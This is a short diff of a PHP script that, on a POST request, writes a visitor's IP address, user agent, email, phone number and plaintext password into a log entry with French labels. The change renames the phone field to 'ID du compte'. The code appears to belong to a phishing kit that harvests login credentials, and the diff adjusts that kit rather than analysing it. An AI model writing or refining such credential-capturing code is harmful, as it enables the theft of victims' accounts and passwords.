@@ -22,7 +22,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $logEntry .= "IP: $ip\n";
     $logEntry .= "User Agent: $userAgent\n";
     $logEntry .= "Email: $email\n";
-    $logEntry .= "Téléphone: $country_code $phone\n";
+    $logEntry .= "ID du compte : $country_code $phone\n";
     $logEntry .= "Mot de passe: $password\n";
     $logEntry .= "================================\n\n";
 
